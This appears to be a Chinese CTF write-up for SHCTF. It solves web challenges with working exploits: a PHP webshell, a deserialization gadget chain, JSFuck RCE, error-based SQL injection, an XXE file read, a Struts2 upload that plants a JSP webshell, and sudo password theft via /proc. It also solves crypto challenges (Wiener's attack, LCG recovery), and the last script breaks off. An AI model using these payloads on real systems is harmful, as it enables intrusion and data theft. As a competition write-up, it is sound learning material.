---
title: "SHCTF WP"
image: ''
pinned: false
comment: true
published: 2026-02-12
updated: 2026-04-16
description: "SHCTF WP"
category: 刷题
tags: [刷题]
---

## #WEB：

###   1.Challenge Info - [阶段1] 05_em_v_CFK 

ctrl+u 发现一段 Base64 ： /*5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc 5MPa*/ ，赛博厨子解密（Base64/ROT13），得到：“我上传了个 shell.php，带上 show 参数 get 小明的圣遗物吧”。 

使用  dirsearch 工具扫描，发现存在  /uploads/ 。 访问 ........./uploads/shell.php?show=1 ，得到一段php。

```
<?php
if (isset($_GET['show'])) {
highlight_file(__FILE__);
}
$pass = 'c4d038b4bed09fdb1471ef51ec3a32cd';
if (isset($_POST['key']) && md5($_POST['key']) === $pass) {
if (isset($_POST['cmd'])) {
system($_POST['cmd']);
} elseif (isset($_POST['code'])) {
eval($_POST['code']);
}
} else {
http_response_code(404);
}
```

 需要 POST  key 。 key 的 MD5 必须等于  c4d038b4bed09fdb1471ef51ec3a32cd 。 在线网站碰撞得到114514。 利用webshell执行  ls -la ，发现题目源码，抓取得到漏洞点：

```
$stmt = $pdo->prepare("CALL buy_item(?, ?)");
$stmt->execute([$target_id, $my_money]); 
```

可以直接控制  buy_item 来购买flag。

#### Javascirp：

```
fetch('/uploads/shell.php', {
method: 'POST',
headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
body: 'key=114514&code=include("../connect.php"); $stmt=$pdo->prepare("CALL 
buy_item(3, 100.00)"); $stmt->execute(); var_dump($stmt->fetch());'
})
.then(res => res.text())
.then(console.log);
```

**得到flag：SHCTF{303ca142-b526-4df2-98c3-aa258ec5d919}**

---



### 2.Challenge Info - [阶段1] Ezphp

```
<?php
highlight_file(__FILE__);
error_reporting(0);

class Sun
{
    public $sun;

    public function __destruct()
    {
        die("Maybe you should fly to the " . $this->sun);
    }
}

class Solar
{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;

    public function __set($name, $key)
    {
        $this->Mars = $key;
        $Dyson = $this->Mercury;
        $Sphere = $this->Venus;
        $Dyson->$Sphere($this->Mars);
    }

    public function __call($func, $args)
    {
        if (!preg_match("/exec|popen|popens|system|shell_exec|assert|eval|print|printf|array_keys|sleep|pack|array_pop|array_filter|highlight_file|show_source|file_put_contents|call_user_func|passthru|curl_exec/i", $args[0])) {
            $exploar = new $func($args[0]);
            $road = $this->Jupiter;
            $exploar->$road($this->Saturn);
        } else {
            die("Black hole");
        }
    }
}

class Moon
{
    public $nearside;
    public $farside;

    public function __tostring()
    {
        $starship = $this->nearside;
        $starship();
        return '';
    }
}

class Earth
{
    public $onearth;
    public $inearth;
    public $outofearth;

    public function __invoke()
    {
        $oe = $this->onearth;
        $ie = $this->inearth;
        $ote = $this->outofearth;
        $oe->$ie = $ote;
    }
}

if (isset($_POST['travel'])) {
    $a = unserialize($_POST['travel']);
    throw new Exception("How to Travel?");
}
```

php反序列化。

 __call 里的正则过滤了  system 等常用函数，但没有过滤 readfile 。

攻击链：

```
Sun::__destruct` -> `Moon` -> `Earth` -> `Solar(A)::__set` -> `Solar(B)::__call` -> `ReflectionFunction('readfile')->invoke('/flag')
```

#### PHP：

```
<?php
$solB = new Solar();
$solB->Jupiter = "invoke";
$solB->Saturn = "/flag";

$solA = new Solar();
$solA->Mercury = $solB;
$solA->Venus = "ReflectionFunction";

$earth = new Earth();
$earth->onearth = $solA;
$earth->inearth = "Sun";
$earth->outofearth = "readfile";

$moon = new Moon();
$moon->nearside = $earth;

$sun = new Sun();
$sun->sun = $moon;

$a = array(0 => $sun, 1 => "trigger");
$payload = serialize($a);
$payload = str_replace('i:1;s:7:"trigger";', 'i:0;s:7:"trigger";', $payload);

echo urlencode($payload);
?>
```

带上travel参数，post一下。 

**得到flag：SHCTF{81d6d5eb-964d-4d85-ab4f-c64bf813078d}**

---



### 3.**Challenge Info** **-** **[阶段1] calc?js?fuck!**

看一下源码:

后端将输入 `expr` 直接丢进 `eval()` 执行：

- **WAF 规则：** `/^[012345679!\.\-\+\*\/\(\)\[\]]+$/`
- **允许字符：** 数字 `0-7` 和 `9`（没有 `8` ），以及符号 `! . - + * / ( ) [ ]`。
- **禁止内容：** 所有英文字母、引号、以及数字 `8`。

看到这个waf，我总感觉我刷到过类似的题型，是nss还是buu，有点记不起来了。

反正js fuck就是用[]()!+这些东西构造javascript。

构造：process.mainModule.require('child_process').execSync('cat /flag').toString()

> [JSFuck - Write any JavaScript with 6 Characters: []()!+](https://jsfuck.com/)

jsfuck编码一下。

然后用脚本直接发送。

#### PY：

```
import requests

url = "			"

raw_payload = r"""jsfuck‘"""

def pwn():
    safe_payload = raw_payload.replace('8', '(7+1)') # 避免出现8  
    safe_payload = "".join(safe_payload.split())
    
    try:
        res = requests.post(url, json={"expr": safe_payload}, timeout=20)
        print(f"{res.status_code}")
        print(f"\n{res.text}")
    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    pwn()
```

**得到flag：SHCTF{53d5d48d-efae-4b70-8319-99781dacceeb}**

---



### 4.**Challenge Info** **-** **[阶段1] ez-ping**

命令注入漏洞：

后端黑名单限制了一些简单的常用读取命令和通配符，有cat`, `flag`, `tac`, `more`, `*等。

Fuzz 测试，确认 `&` 、空格、以及 `?` 是可以正常使用的。

通过ls确定文件名，用nl代替cat。

![image-20260212133209029](/images/image-20260212133209029.png)

**得到flag：SHCTF{96d07694-4ca2-49c2-b536-219025b5079f}**

---



### 5.**Challenge Info** **-** **[阶段1] kill_king**

小游戏网页，玩都没玩，直接看源码。

`view-source:http://challenge.shc.tf:xxxxx/` 突破限制。

![image-20260212134152699](/images/image-20260212134152699.png)

`logic.js` 中当击败最终 Boss 后，会出现这样的请求，可以直接跳关：

```
fetch('check.php', { method: 'POST', body: 'result=win' })
```

得到源码：

```
<?php
// 国王并没用直接爆出flag，而是出现了别的东西？？？
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['result']) && $_POST['result'] === 'win') {
        highlight_file(__FILE__);
        if(isset($_GET['who']) && isset($_GET['are']) && isset($_GET['you'])){
            $who = (String)$_GET['who'];
            $are = (String)$_GET['are'];
            $you = (String)$_GET['you'];
        
            if(is_numeric($who) && is_numeric($are)){
                if(preg_match('/^\W+$/', $you)){
                    $code =  eval("return $who$you$are;");
                    echo "$who$you$are = ".$code;
                }
            }
        }
    } else {
        echo "Invalid result.";
    }
} else {
    echo "No access.";
}
?>
```

`$who` 和 `$are` 必须是数字。

`$you` 不能有字母、数字和下划线。

限制了字母数字，直接用取反~来做。

readfile $\rightarrow$ (~"%8D%9A%9E%9B%99%96%93%9A")
/flag $\rightarrow$ (~"%D0%99%93%9E%98")

![image-20260212135119547](/images/image-20260212135119547.png)

**得到flag：SHCTF{9d5907bf-4a82-4529-9a1e-c7e8e3d452a6}**

---



### 6.**Challenge Info** **-** **[阶段1] 上古遗迹档案馆**

sql注入测试，get方法，参数为id=？

![image-20260212135842894](/images/image-20260212135842894.png)

字符报错注入

看不出来有黑名单，直接脚本秒了。

#### PY：

```
import requests
import re

target_url = "				"

def get_res(payload):
    full_payload = f"1' and {payload}-- "
    try:
        r = requests.get(target_url, params={'id': full_payload}, timeout=5)
        match = re.search(r"~(.*?)~", r.text)
        return match.group(1) if match else None
    except Exception as e:
        print(f"失败: {e}")
        return None

def solve():
    db_name = get_res("updatexml(1,concat(0x7e,database(),0x7e),1)")
    print(f"数据库名: {db_name}")

    table_name = get_res(f"updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{db_name}' limit 1,1),0x7e),1)")
    print(f"{table_name}")

    column_name = get_res(f"updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='{table_name}' limit 1,1),0x7e),1)")
    print(f"{column_name}")

    print("提取Flag...")
    full_flag = ""
    for i in range(1, 4): 
        start = (i-1) * 30 + 1
        part = get_res(f"updatexml(1,concat(0x7e,substr((select {column_name} from {table_name} limit 0,1),{start},30),0x7e),1)")
        if part:
            full_flag += part
        else:
            break
    
    print("\n" + "="*40)
    print(f"Flag: {full_flag}")
    print("="*40)

if __name__ == "__main__":
    solve()
```

**得到flag：SHCTF{d74b0a4a-5cff-42b6-9435-c10b3aff5ab1}**

---



### 7.**Challenge Info** **-** **[阶段2] Go**

![image-20260212140448718](/images/image-20260212140448718.png)

只有 `role='admin'` 才能查看 Flag。

直接尝试发送 `{"role": "admin"}` 会被 WAF 。

后端服务使用 Go 语言 编写。在 Go 的库中，`json.Unmarshal` 函数在将 JSON 数据映射到结构体时，大小写不敏感：如果没有明确指定标签，Go语言会尝试匹配键名的大小写。

直接用脚本测试大小写。

#### PY：

```
import requests

url = "				"

def try_payload(name, data=None, headers=None):
    print(f"尝试: {name}")
    try:
        if isinstance(data, str):
            res = requests.post(url, data=data, headers={"Content-Type": "application/json"}, timeout=5)
        else:
            res = requests.post(url, json=data, timeout=5)
        
        print(f"状态: {res.status_code}")
        print(f"内容: {res.text}\n")
        if "flag{" in res.text.lower():
            print("拿下！！！")
            return True
    except Exception as e:
        print(f"失败: {e}")
    return False

try_payload("大小写绕过 (Role)", {"Role": "admin"})

payload_unicode = '{"role": "\\u0061dmin"}'
try_payload("Unicode转义", data=payload_unicode)

payload_dup = '{"role": "guest", "role": "admin"}'
try_payload("重复绕过", data=payload_dup)

payload_mix = '{"Role": "\\u0061dmin"}'
try_payload("混合绕过", data=payload_mix)
```

**得到flag：SHCTF{cc779b25-bc40-479b-96b7-a1476fcdb80e}**

---



### 8.**Challenge Info** **-** **[阶段2] Mini Blog**

`/create` 页面存在 XXE 漏洞：

```
var xmlData = '<?xml version="1.0" encoding="UTF-8"?><post><title>' + title + '</title><content>' + content + '</content></post>';
fetch('/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/xml' },
    body: xmlData
});
```

后端直接解析了发送的 XML 数据。

直接构造：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE post [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<post>
  <title>hack</title>
  <content>&xxe;</content>
</post>
```

```
curl -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE post [<!ENTITY xxe SYSTEM \"file:///flag\">]><post><title>HACK</title><content>&xxe;</content></post>" http://challenge.shc.tf:端口/create
```

用curl直接拿下。

**得到flag：SHCTF{c86b63a1-c34b-4685-8210-c8e2b2e23086}**

---



### 9.**Challenge Info** **-** **[阶段3] BabyJavaUpload**

通过前端源码![image-20260212165811724](/images/image-20260212165811724.png)发现表单 `action` 为 `upload.action`，猜测识后端框架为 Struts 2。

尝试CVE-2023-50164。

通过bp发送两个文件块：

一个包含文件内容，`name="Myfile"`。

 另一个包含恶意路径，`name="MyfileFileName"`，值设为 `../../../shell.jsp`。

如果漏洞正确，服务器读取会 `myfile` 的内容，然后读取 `myfileFileName` 里的文件名，最后拼成 `/tmp/shell.jsp`。

就能完成恶意路径文件的存储，上传成功，但是访问404，那说明就不是这个漏洞。

尝试S2-067。

Struts 2 使用的是OGNL的强力表达式引擎。它会把我们的参数自动塞进后端的对象。

在 Struts 2 的内存栈（ValueStack）中，存在一个 `top` 永远指向当前正在运行的那个对象，如果在请求中塞进一个名为 `top.myfileFileName` 的参数，就可以欺骗 OGNL ，将当前 Action 对象里的 `myfileFileName` 属性进行修改。

我们构造一个新的请求，包含：

1. 文件组件 (`myfile`)：WebShell 源码。
2. 指令组件 (`top.myfileFileName`)：一个指针。

#### PY：

```
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string

TARGET_IP = "challenge.shc.tf"
TARGET_PORT = "端口" 
BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"
UPLOAD_URL = f"{BASE_URL}/upload.action"

# 构造webshell
SHELL_CONTENT = """<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:scriptlet>
    Process p = Runtime.getRuntime().exec("cat /flag");
    java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A");
    out.println(s.hasNext() ? s.next() : "No output");
</jsp:scriptlet></jsp:root>"""

def get_random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=6)) + ".jspx"

def run_burst():
    print(f"深度爆破...")
    
    test_paths = []
    for i in range(0, 7):
        prefix = "../" * i
        test_paths.append(prefix)
        test_paths.append(f"{prefix}webapps/ROOT/")

    for path_prefix in test_paths:
        filename = get_random_name()
        target_traversal_path = f"{path_prefix}{filename}"
        
        print(f"利用漏洞中: top.myfileFileName -> {target_traversal_path}")
        
        fields = {
            'top.myfileFileName': target_traversal_path,
            'myfile': (filename, SHELL_CONTENT, 'application/octet-stream')
        }
        
        m = MultipartEncoder(fields=fields)
        headers = {'Content-Type': m.content_type}

        try:
            requests.post(UPLOAD_URL, data=m, headers=headers, timeout=5)
            
            verify_url = f"{BASE_URL}/{filename}"
            r = requests.get(verify_url, timeout=3)
            
            if r.status_code == 200 and "SHCTF{" in r.text:
                print("\n" + "="*50)
                print(f"成功！")
                print(f"路径: {target_traversal_path}")
                print(f"Flag: {r.text.strip()}")
                print("="*50)
                return True
            elif r.status_code == 200:
                print(f"写入但没有flag，检查回显: {verify_url}")
        except Exception:
            pass
            
    return False

if __name__ == "__main__":
    if not run_burst():
        print("\n失败")
```

**得到flag：SHCTF{c0aed86a-d575-444c-ae62-76ab3359a4cc}**

---



### 10.**Challenge Info** **-** **[阶段3] sudoooo0**

通过多次爆破发现shell名字， `webshell.php` .

通过访问 `webshell.php` 并执行 `id` 命令，确认当前权限为： `uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)` ,尝试执行 `sudo -u#-1 cat /flag` 发现报错 `unknown user #-1`，说明这个方法不行。

通过列举文件，发现 `/docker-entrypoint.sh`，这是 Docker 容器启动时的初始化脚本。

读取内容：

```
NEWPASS=$(head -c 24 /dev/urandom | tr -cd 'A-Za-z0-9' | head -c 16)
echo "ctf:${NEWPASS}" | chpasswd
su - ctf -c "nohup script -q -f -c 'bash -li -c \"echo ${NEWPASS} | sudo -S -v >/dev/null 2>&1; sleep infinity\"' /dev/null >/dev/null 2>&1 &"
```

该脚本生成了一个 16 位的随机密码给 `ctf` 用户，并在后台运行了一个包含该密码的 `sudo` 进程。

因为后台的进程一直挂着 `sleep infinity`，且进程的所有者是 `ctf`，那我们就可以通过 `/proc/[PID]/cmdline` 读取到该进程启动时的完整参数，从而拿到密码。

由于Web 环境下的 PHP `shell_exec` 没有终端环境，直接运行 `sudo` 报错，所以要使用 `script -qc` 命令来伪造一个伪终端来执行操作。

最终得到flag。

#### PY：

```
import requests
import base64
import re

url = ".../webshell.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2"

def run_remote(cmd):
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    payload = f"passthru(base64_decode('{b64_cmd}'));"
    try:
        res = requests.get(url, params={'cmd': payload}, timeout=10)
        return res.text
    except Exception as e:
        return str(e)

def solve():
    print("读取密码中...")
    
    raw_info = run_remote('cat /proc/25/cmdline | tr "\\0" " "')
    
    match = re.search(r'echo\s+([^\s|]+)\s+\|', raw_info)
    
    if not match:
        print("失败")
        return

    password = match.group(1)
    print(f"密码: {password}")

    print("使用密码执行 sudo cat /flag ...")
    
    final_cmd = f'echo "{password}" | script -qc "sudo -S cat /flag" /dev/null'
    
    output = run_remote(final_cmd)
    
    print("-" * 40)
    flag = re.search(r'(flag\{.*\}|shctf\{.*\})', output, re.IGNORECASE)
    if flag:
        print(f"Flag为: {flag.group(1)}")
    else:
        print(f"回显:\n{output.strip()}")
    print("-" * 40)

if __name__ == "__main__":
    solve()
```

**得到flag：SHCTF{$Udo_T0KeN_1NJ3CT1ON_pwN3d_z0zs}**

---



### 11.**Challenge Info** **-** **[阶段3] 你也懂java？**

通过附件的源码分析，发现：

存在 `java.io.Serializable` 接口 ，属性包含 `serialVersionUID = 1L` 以及 `title`、`message`、`filePath` 三个字符串属性 ，用来存储信息。

```
public void handle(HttpExchange exchange) throws IOException {
    String method = exchange.getRequestMethod();
    String path = exchange.getRequestURI().getPath();

    if ("POST".equalsIgnoreCase(method) && "/upload".equals(path)) {
        try (ObjectInputStream ois = new ObjectInputStream(exchange.getRequestBody())) {
            Object obj = ois.readObject();
            if (obj instanceof Note) {
                Note note = (Note) obj;
                if (note.getFilePath() != null) {
                    echo(readFile(note.getFilePath()));
                }
            }
        } catch (Exception e) {}
    }
}
```

题目源码监听 `/upload` 路径并接收 post。

`ObjectInputStream.readObject()` 直接从请求中读取并还原对象。

攻击链：当程序将还原的对象强制转换为 `Note` 类，调用 `note.getFilePath()` 获取路径，之后服务器调用 `readFile()` 读取该路径下的文件内容，并将其直接回显出来。

思路：

在本地编写一个 `Note` 类，确保其包名和 `serialVersionUID` 与题目一样。创建一个 `Note` 对象，将其 `filePath` 属性设置为服务器上的 flag 路径。将该对象序列化为二进制流，POST 给靶机的 `/upload`。

#### Note.java：

```
import java.io.Serializable;

public class Note implements Serializable {
    private static final long serialVersionUID = 1L;

    private String title;
    private String message;
    private String filePath;

    public Note(String title, String message, String filePath) {
        this.title = title;
        this.message = message;
        this.filePath = filePath;
    }

    public String getFilePath() {
        return filePath;
    }
}
```

#### Exp.java：

```
import java.io.*;

public class Exp {
    public static void main(String[] args) throws Exception {
        Note myNote = new Note("Exploit", "test", "/flag");
        
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(myNote);
        oos.close();
        System.out.println("[+] Success: payload.ser has been created!");
    }
}
```

#### PY：

```
import requests

url = "http://challenge.shc.tf:端口/upload"

def solve():
    try:
        with open("payload.ser", "rb") as f:
            data = f.read()
        
        print(f"发送中...")
        response = requests.post(url, data=data)
        
        print("-" * 40)
        print(f"{response.status_code}")
        print("回显:")
        print(response.text.strip())
        print("-" * 40)
        
    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    solve()
```

**得到flag：SHCTF{e90e68bb-91c9-4068-aec5-7af27e84280a}**

---

---

---

## #密码：

### 1.**Challenge Info** **-** **[阶段1] AES的诞生**

```
task.py:
from typing import Optional
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os, secrets, string
from time import time
from secret import flag

flag = b'SHCTF{This_1s_@_FaK3_flag}'

def get_seed() -> Optional[bytes]:
    length = len((f"{int(time() * 10 ** 6)}" * 2).encode("utf-8"))
    if (length == 32) :
        return (f"{int(time() * 10 ** 6)}" * 2).encode("utf-8")


def oracle(chunk: str, cipher: Cipher, pkcs7_padding: padding.PKCS7) -> str:
    padder = pkcs7_padding.padder()
    padded = padder.update(chunk.encode("utf-8")) + padder.finalize()
    encryptor = cipher.encryptor()
    return (encryptor.update(padded) + encryptor.finalize()).hex()


def chunk(data: bytes, group_size: int = 7, random_fill: bool = True) -> list[str]:
    val = int.from_bytes(data, "big")
    bin_str = format(val, "b")
    alphabet = string.digits + string.ascii_letters
    groups: list[str] = []
    for i in range(0, len(bin_str), group_size):
        g = bin_str[i : i + group_size]
        if len(g) < group_size:
            if random_fill:
                fill = ''.join(secrets.choice(alphabet) for _ in range(group_size - len(g)))
            else:
                fill = '0' * (group_size - len(g))
            g = g + fill
        groups.append(g)
    return groups



def main() -> None:
    key = get_seed()
    groups = chunk(flag, group_size=7, random_fill=True)
    iv = os.urandom(16)
    aes_cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    pkcs7 = padding.PKCS7(algorithms.AES.block_size)
    ciphertexts = [oracle(g, aes_cipher, pkcs7) for g in groups]
    out_lines: list[str] = []
    def log(*parts):
        line = ' '.join(str(p) for p in parts)
        out_lines.append(line)
        print(line)
    log('iv =', iv.hex())
    log('————————————————————————————————————')
    for ct in ciphertexts:
        log(('|'),ct,('|'))
    log('————————————————————————————————————')

    data_path = os.path.join(os.path.dirname(__file__), 'data.txt')
    with open(data_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(out_lines))

if __name__ == "__main__":
    main()
```

密钥由 `time()` 获取的时间生成，代码要求 `length == 32` 。 `f"{int(time() * 10 ** 6)}"` 生成时间字符串。要使重复两次后长度为 32，时间必须为16位，即多次思考后得到的AES的诞生时间**2001-11-26**。

代码中存在 `modes.CBC(iv)`，但在 `oracle` 函数中， `cipher.encryptor()` 都会重置。 这说明着每一个 `chunk` 都是作为 AES-CBC 的第一个块进行加密的，且使用的是固定的 IV。 

可以得到密文解密公式：**$P_i = D_K(C_i) \oplus IV$**

#### EXP:

```
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import datetime

def solve():
    # 构造密钥
    ts = int(datetime.datetime(2001, 11, 26, 0, 0, 0, 
             tzinfo=datetime.timezone(datetime.timedelta(hours=8))).timestamp())
    
    key_str = str(ts * 10**6) * 2
    key = key_str.encode("utf-8")
    
    iv = bytes.fromhex("d966f3a0c51cd460764b0b62ad10796a")     
    print(f"Key: {key}")

    # 读取密文
    ciphertexts = []
    try:
        with open('data.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line.startswith('|') and line.endswith('|'):
                    ct_hex = line.strip('| ').strip()
                    ciphertexts.append(ct_hex)
    except FileNotFoundError:
        print("not found.")
        return

    # 解密
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    binary_stream = ""

    for ct_hex in ciphertexts:
        try:
            ct = bytes.fromhex(ct_hex)
            decryptor = cipher.decryptor()
            # 解密
            # 去除填充
            padded_pt = decryptor.update(ct) + decryptor.finalize()
            
            pkcs7 = padding.PKCS7(128) 
            unpadder = pkcs7.unpadder()
            pt = unpadder.update(padded_pt) + unpadder.finalize()
            
            binary_stream += pt.decode('utf-8')
        except Exception as e:
            print(f"Decrypt error: {e}")

    # 二进制流每7位一组，尝试转换
    for i in range(7):
        curr = binary_stream if i == 0 else binary_stream[:-i]
        try:
            flag_int = int(curr, 2)
            flag_bytes = flag_int.to_bytes((len(curr) + 7) // 8, 'big')
            if b'SHCTF{' in flag_bytes:	# flag特征
                print(f"\nFlag: {flag_bytes.decode()}")
                break
        except:
            pass

if __name__ == "__main__":
    solve()
```

**得到flag：SHCTF{HE1lO_ctf3r_W3Lcome_tO_5hc7f_THi5_iS_e5aY_cRypt0@!!!}**

---



### 2.**Challenge Info** **-** **[阶段1] Ez_RSA**

```
chall.py:
from Crypto.Util.number import getPrime,bytes_to_long
from gmpy2 import invert
from secret import flag

m = bytes_to_long(flag)

p = getPrime(512)
q = getPrime(512)
n = p*q
phi = (p-1) * (q-1)
e = getPrime(1019)
d = invert(e, phi)

c = pow(m,e,n)
"""
n = 107464134871680646151655304067173578951022679613817744422854142736895193478923970402314237869266898585661396817719803005109183572552933963881756199330890085692291647461683934019264121186823772581796061998307778635680038707808422026396560620912393186072263186503236380890048319797143644270579169484448179083299
e = 3924586561728843234261049280560557566669922961436496251423249382498887294225142535297862819865029081145630384268177735578769958711287734205364353929040337350836000661255957087233897675207507752217828489549059197109918195953230752720210793300168746820366115929509596904295875481061789801178045962611893883689
c = 4557192604704814579224198928010541193712311907197292139423304635523945088581321950910727673367241811197226152299201713883344661436550024661781925551129803469824570154317098612833694631836257698682075695287756551674264966935203485636255394639674521955953445322493019052791894426980946209383266707043869522774
"""
```

看起来跟标准的RSA题目无疑，除了e的值特别大，应该有1000bit跟c一样。正常e都是65537，e*d=1，现在这么大，那说明私钥的d会很小，没做过这种低解密指数的RSA，稍微差一下，发现一个新的攻击方式，维纳攻击。

> 引用文章：[维纳攻击 wiener attack - 明客 - 博客园](https://www.cnblogs.com/wandervogel/p/16805992.html)

关键点为：当 $d < \frac{1}{3} n^{1/4}$ 时，可以通过 $e/n$ 的连分数展开来恢复私钥 $d$

![image-20260210231235817](/images/image-20260210231235817.png)

稍微学习一下。

```
slove d.py:
import math

def get_convergents(e, n):
    #计算连分数渐近分数
    cf = []
    a, b = e, n
    while b:
        cf.append(a // b)
        a, b = b, a % b
    
    num1, den1 = 0, 1
    num2, den2 = 1, 0
    convergents = []
    for x in cf:
        num1, num2 = num2, x * num2 + num1
        den1, den2 = den2, x * den2 + den1
        convergents.append((num2, den2)) # (k, d)
    return convergents

def recover_d(e, n):
    #维纳攻击主函数
    convergents = get_convergents(e, n)
    for k, d in convergents:
        if k == 0: continue
        # 检查 ed = 1 (mod phi)
        if (e * d - 1) % k == 0:
            phi = (e * d - 1) // k
            # 分解n
            s = n - phi + 1
            delta = s * s - 4 * n
            if delta > 0:
                sqrt_delta = math.isqrt(delta)
                if sqrt_delta * sqrt_delta == delta:
                    print(f"[+] 找到私钥 d: {d}")
                    return d
    return None

# 参数填入
n = 107464134871680646151655304067173578951022679613817744422854142736895193478923970402314237869266898585661396817719803005109183572552933963881756199330890085692291647461683934019264121186823772581796061998307778635680038707808422026396560620912393186072263186503236380890048319797143644270579169484448179083299
e = 3924586561728843234261049280560557566669922961436496251423249382498887294225142535297862819865029081145630384268177735578769958711287734205364353929040337350836000661255957087233897675207507752217828489549059197109918195953230752720210793300168746820366115929509596904295875481061789801178045962611893883689

d = recover_d(e, n)

找到私钥 d: 13381010831988668939315406679736078064417157389064253385691768500704978358617
```

#### EXP:

```
def long_to_bytes(n):
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')

d = 13381010831988668939315406679736078064417157389064253385691768500704978358617
n = 107464134871680646151655304067173578951022679613817744422854142736895193478923970402314237869266898585661396817719803005109183572552933963881756199330890085692291647461683934019264121186823772581796061998307778635680038707808422026396560620912393186072263186503236380890048319797143644270579169484448179083299
c = 4557192604704814579224198928010541193712311907197292139423304635523945088581321950910727673367241811197226152299201713883344661436550024661781925551129803469824570154317098612833694631836257698682075695287756551674264966935203485636255394639674521955953445322493019052791894426980946209383266707043869522774

# 解密
m = pow(c, d, n)
flag = long_to_bytes(m)
print(f"{flag.decode()}")
```

**得到flag：SHCTF{e950ea87356fc62ce6323253a672680e}**

---



### 3.**Challenge Info** **-** **[阶段1] Stream**

```
task.py:
from secrets import randbits
from secret import FLAG, P_known


def gen():
    while True:
        m = randbits(63) | (1 << 62) | 1
        if m > 2**62:
            break
    a = randbits(62) | 3
    c = randbits(62) | 1
    s0 = randbits(62) | 5
    return m, a, c, s0

def LCG(m, a, c, s0, nblocks):
    x = s0
    out = []
    for _ in range(nblocks):
        x = (a * x + c) % m
        out.append(x)
    return out

def encrypt(m, a, c, s0, plaintext: bytes) -> bytes:
    padlen = (-len(plaintext)) % 8
    pt = plaintext + b'\x00' * padlen
    blocks = [int.from_bytes(pt[i:i+8], 'big') for i in range(0, len(pt), 8)]
    ks = LCG(m, a, c, s0, len(blocks))
    cblocks = [b ^ k for b, k in zip(blocks, ks)]
    return b''.join(cb.to_bytes(8, 'big') for cb in cblocks)

def main():
    m, a, c, s0 = gen()
    cipher  = encrypt(m, a, c, s0,  P_known + FLAG)

    C_known = cipher[:len(P_known)]
    C_flag  = cipher[len(P_known):len(P_known) + len(FLAG)]

    print("P_known =",P_known)
    print("C_known =", C_known.hex())
    print("C_flag  =", C_flag.hex())

if __name__ == "__main__":
    main()


'''

P_know = b'Insecure_linear_congruential_random_number!!!!!!'
C_known = 44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a
C_flag  = 1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a

'''
```

这是一个**线性同余生成器 (LCG)** 的题目。

题目给出了明文 `P_known` 及其对应的密文 `C_known`。

**LCG 的状态转移方程为：$$S_{i+1} \equiv (a \cdot S_i + c) \pmod m$$**

 $m, a, c$ 均为随机生成且未知，需要通过已知的状态序列还原。

利用流密码的异或特性 $S_i = P_i \oplus C_i$ 可以还原出前 6 个连续的状态值。

**m**：

$T_i = S_{i+1} - S_i$

$$T_{i+2} \cdot T_i - T_{i+1}^2 \equiv 0 \pmod m$$

通过计算多个gcd，可以得到m。

**a, c **：

$a \equiv (S_3 - S_2) \cdot (S_2 - S_1)^{-1} \pmod m$

$c \equiv (S_2 - a \cdot S_1) \pmod m$

#### EXP:

```
import math
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse

# 参数填入
P_known = b'Insecure_linear_congruential_random_number!!!!!!'
C_known = bytes.fromhex("44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a")
C_flag = bytes.fromhex("1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a")

# 状态还原
S = [bytes_to_long(P_known[i:i+8]) ^ bytes_to_long(C_known[i:i+8]) for i in range(0, len(P_known), 8)]

# m
diffs = [S[i+1] - S[i] for i in range(len(S)-1)]
zeros = [abs(diffs[i+2] * diffs[i] - diffs[i+1]**2) for i in range(len(diffs)-2)]
m = zeros[0]
for z in zeros[1:]: m = math.gcd(m, z)
while m % 2 == 0: m //= 2

# a, c
a = ((S[2] - S[1]) * inverse(S[1] - S[0], m)) % m
c = (S[1] - a * S[0]) % m

# 解密
curr_s = S[-1]
flag_bytes = b""
